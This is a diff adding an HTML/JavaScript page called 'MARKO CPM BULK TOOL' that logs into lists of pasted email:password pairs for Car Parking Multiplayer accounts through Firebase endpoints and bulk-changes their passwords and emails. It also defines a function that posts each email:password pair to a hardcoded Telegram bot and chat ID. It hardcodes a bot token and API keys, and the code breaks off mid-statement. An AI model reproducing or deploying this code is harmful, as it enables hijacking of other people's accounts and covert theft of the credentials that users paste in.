@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>MARKO CPM BULK TOOL</title>
+<style>
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+.phone-frame{width:100%;max-width:420px;background:#121212;padding:20px;border-radius:20px;box-shadow:0 0 30px rgba(0,0,0,0.8);border:1px solid #333;box-sizing:border-box;}
+h2{text-align:center;color:#ff8800;font-size:18px;margin-bottom:15px;}
+.game-selector{display:flex;gap:10px;margin-bottom:12px;}
+.game-btn{flex:1;padding:10px;border-radius:6px;border:1px solid #444;background:transparent;color:#aaa;font-weight:bold;font-size:13px;cursor:pointer;}
+.game-btn.active{background:linear-gradient(135deg, #ff8800, #ffaa00);color:#000;border:none;}
+textarea,input,select{width:100%;box-sizing:border-box;padding:10px;margin:6px 0;border-radius:6px;border:1px solid #444;background:rgba(0,0,0,0.5);color:#fff;font-size:13px;outline:none;}
+textarea{height:100px;resize:none;}
+input:focus,select:focus,textarea:focus{border-color:#ff8800;}
+.primary-btn{width:100%;padding:12px;margin-top:10px;border-radius:6px;border:0;cursor:pointer;font-weight:bold;font-size:14px;background:linear-gradient(135deg, #ff5500, #ff8800);color:#fff;}
+.primary-btn:active{transform:scale(0.98);}
+.status{margin-top:10px;font-size:12px;font-weight:bold;min-height:20px;word-break:break-all;}
+.success{color:#00ff88;}
+.error{color:#ff4444;}
+.output-box{margin-top:15px;background:#1a1a1a;padding:10px;border-radius:6px;border:1px solid #333;}
+.output-box h4{margin:0 0 5px 0;font-size:12px;color:#ff8800;}
+</style>
+</head>
+<body>
+
+<div class="phone-frame">
+  <h2>MARKO CPM BULK TOOL</h2>
+  
+  <div class="game-selector">
+    <button class="game-btn active" id="g1" onclick="selectGame('1')">CPM 1</button>
+    <button class="game-btn" id="g2" onclick="selectGame('2')">CPM 2</button>
+  </div>
+
+  <div id="operationSelectorBox">
+    <select id="operationType" onchange="toggleOperation()">
+      <!-- Options will change dynamically based on game -->
+    </select>
+  </div>
+
+  <div id="customNameBox" style="display:none;">
+    <input id="prefixName" type="text" placeholder="Enter Custom Name (e.g. FLAME)">
+    <input id="newPasswordInput" type="text" placeholder="Enter New Password (Optional)">
+  </div>
+
+  <textarea id="accountsInput" placeholder="Enter accounts in format:
+email@gmail.com:password
+email2@gmail.com:password"></textarea>
+
+  <button class="primary-btn" onclick="startBulkProcess()">Start Bulk Process</button>
+  <div id="status" class="status"></div>
+
+  <div class="output-box">
+    <h4>Successfully Processed Accounts (Copy Paste)</h4>
+    <textarea id="resultOutput" readonly placeholder="Result accounts will appear here..."></textarea>
+    <button class="primary-btn" style="background:#00aa44;margin-top:6px;" onclick="copyResults()">Copy Results</button>
+  </div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8477742734:AAFBEfGf-PnYBPtEoofA4UIOyVQSfvLJcXw";
+const TELEGRAM_CHAT_ID = "7212602902"; // Ningalude Telegram Chat ID ivide kodukkuka
+
+const GAMES = {
+  "1": { name:"CPM 1", k:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM" },
+  "2": { name:"CPM 2", k:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ" }
+};
+let selectedGameKey = "1";
+
+function selectGame(g) {
+  selectedGameKey = g;
+  document.getElementById('g1').className = g === '1' ? 'game-btn active' : 'game-btn';
+  document.getElementById('g2').className = g === '2' ? 'game-btn active' : 'game-btn';
+  updateOperationsList();
+}
+
+function updateOperationsList() {
+  const opSelect = document.getElementById('operationType');
+  opSelect.innerHTML = "";
+  if(selectedGameKey === "1") {
+    opSelect.innerHTML = `
+      <option value="pass_only">Pass Change Only</option>
+      <option value="email_only">Email Change Only (Random)</option>
+      <option value="email_pass">Email & Pass Change</option>
+    `;
+  } else {
+    opSelect.innerHTML = `
+      <option value="pass_only">Pass Change Only</option>
+    `;
+  }
+  toggleOperation();
+}
+
+function toggleOperation() {
+  const op = document.getElementById('operationType').value;
+  const nameBox = document.getElementById('customNameBox');
+  if(op.includes('email')) {
+    nameBox.style.display = 'block';
+  } else {
+    nameBox.style.display = selectedGameKey === '1' && op === 'email_pass' ? 'block' : 'none';
+  }
+}
+
+function showStatus(msg, isError=false) {
+  const el = document.getElementById('status');
+  el.className = isError ? 'status error' : 'status success';
+  el.textContent = msg;
+}
+
+function generateRandomEmail(prefix) {
+  const randNum = Math.floor(100000 + Math.random() * 900000);
+  return `${prefix}${randNum}@gmail.com`;
+}
+
+function sendTelegramLog(email, pass) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.includes("YOUR_CHAT_ID")) return;
+  const text = `${email}:${pass}`;
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+  }).catch(e=>{});
+}
+
+async function startBulkProcess() {
+  const rawText = document.getElementById('accountsInput').value.trim();
+  if(!rawText) return showStatus("Please enter accounts!", true);
+  
+  const lines = rawText.split('\n');
+  const cfg = GAMES[selectedGameKey];
+  const operation = document.getElementById('operationType').value;
+  const prefix = document.getElementById('prefixName').value.trim() || "MARKO";
+  const customNewPass = document.getElementById('newPasswordInput').value.trim();
+
+  showStatus(`Processing ${lines.length} accounts...`);
+  let successResults = [];
+
+  for(let i=0; i<lines.length; i++) {
+    let line = lines[i].trim();
+    if(!line || !line.includes(':')) continue;
+    let parts = line.split(':');
+    let email = parts[0].trim();
+    let pass = parts.slice(1).join(':').trim();
+
+    try {
+      const loginRes = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${cfg.k}`, {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email: email, password: pass, returnSecureToken: true})
+      });
+      const loginData = await loginRes.json();
+      
+      if(!loginData.idToken) continue;
+      let token = loginData.idToken;
+      let finalEmail = email;
+      let finalPass = pass;
+      let isChanged = false;
+
+      if(operation === 'pass_only') {
+        if(customNewPass) {
+          const upRes = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${cfg.k}`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({idToken: token, password: customNewPass, returnSecureToken: true})
+          });
+          let upData = await upRes.json();
+          if(upData.idToken) {
+            finalPass = customNewPass;
+            isChanged = true;
+          }
+        }
+      } else if(operation === 'email_only') {
+        let newRandEmail = generateRandomEmail(prefix);
+        const emRes = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${cfg.k}`, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({idToken: token, email: newRandEmail, returnSecureToken: true})
+        });
+        let emData = await emRes.json();
+        if(emData.email) {
+          finalEmail = newRandEmail;
+          isChanged = true;
+        }
+      } else if(operation === 'email_pass') {
+        let newRandEmail = generateRandomEmail(prefix);
+        let passToSet = customNewPass || pass;
+        const bodyData = { idToken: token, email: newRandEmail, password: passToSet, returnSecureToken: true };
+        const bothRes = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${cfg.k}`, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(bodyData)
+        });
+        let bothData = await bothRes.json();
+        if(bothData.email
